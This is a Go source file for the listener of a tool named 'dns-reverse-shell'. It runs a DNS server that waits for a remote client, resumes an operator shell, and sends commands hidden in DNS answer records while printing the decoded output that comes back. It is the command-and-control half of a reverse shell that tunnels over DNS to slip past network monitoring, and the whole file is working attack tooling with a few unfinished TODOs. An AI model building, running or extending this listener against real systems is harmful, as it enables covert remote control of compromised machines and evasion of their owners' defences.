package listener

import (
	"dns-reverse-shell/main/protocol"
	"dns-reverse-shell/main/protocol/encoder"
	"fmt"
	"github.com/miekg/dns"
)

type dnsHandler struct {
	server *DNSServer
}

func newDnsHandler(s *DNSServer) *dnsHandler {
	return &dnsHandler{server: s}
}

type DNSServer struct {
	port              string
	handler           *dnsHandler
	connectionHandler *connectionHandler
	messageHandler    *protocol.MessageHandler
	commandHandler    protocol.CommandHandler
}

func NewDnsServer(port string) *DNSServer {
	d := &DNSServer{port: port, connectionHandler: newConnectionHandler()}
	d.handler = newDnsHandler(d)
	d.commandHandler = newListenerCommandHandler()
	d.messageHandler = protocol.NewMessageHandler(encoder.NewBase64Encoder(), protocol.NewSimpleMessageSplitter())
	return d
}

func (s *DNSServer) Initialize() {
	server := s.createServer()
	fmt.Println("Starting Listener on port '" + s.port + "'")
	go s.commandHandler.(*listenerCommandHandler).init()
	err := server.ListenAndServe()
	if err != nil {
		fmt.Printf("Failed to start listener: %s\n", err.Error())
	}
}

func (s *DNSServer) createServer() *dns.Server {
	return &dns.Server{
		Addr:      ":" + s.port,
		Net:       "tcp",
		Handler:   s.handler,
		ReusePort: true,
	}
}

// ServeDNS todo: connection clock with timeout after 10 sec -> connection false, print sth, shell.Start()
func (h *dnsHandler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
	if !h.server.connectionHandler.hasConnection {
		h.server.connectionHandler.setConnectionStatus(true)
		//todo: print client addr here
		fmt.Println("connected to {TBD}")
		h.server.commandHandler.(*listenerCommandHandler).shell.Resume()
	}
	h.server.handleMessage(w, r)
}

func (s *DNSServer) handleMessage(w dns.ResponseWriter, r *dns.Msg) {
	for _, question := range r.Question {
		s.commandHandler.HandleCommand(question.Name, s.poll(w, r), s.answer(w, r), s.exit)
	}
}

func (s *DNSServer) poll(w dns.ResponseWriter, r *dns.Msg) func() {
	return func() {
		s.sendAnswer(w, r, "idle")
	}
}

func (s *DNSServer) answer(w dns.ResponseWriter, r *dns.Msg) func(command string) {
	return func(command string) {
		if command == "ok" {
			fmt.Println(s.messageHandler.DecodeAnswerMsg(r))
		}
		s.sendAnswer(w, r, command)
	}
}

func (s *DNSServer) exit() {
	s.connectionHandler.hasConnection = false
}

func (s *DNSServer) sendAnswer(w dns.ResponseWriter, r *dns.Msg, command string) {
	msg := s.messageHandler.CreateAnswerMessage(r)
	msg.Extra = s.messageHandler.BuildDNSExtra(command)
	s.writeMessage(w, msg)
}

func (s *DNSServer) writeMessage(w dns.ResponseWriter, msg *dns.Msg) {
	err := w.WriteMsg(msg)
	if err != nil {
		fmt.Println(err)
		return
	}
}
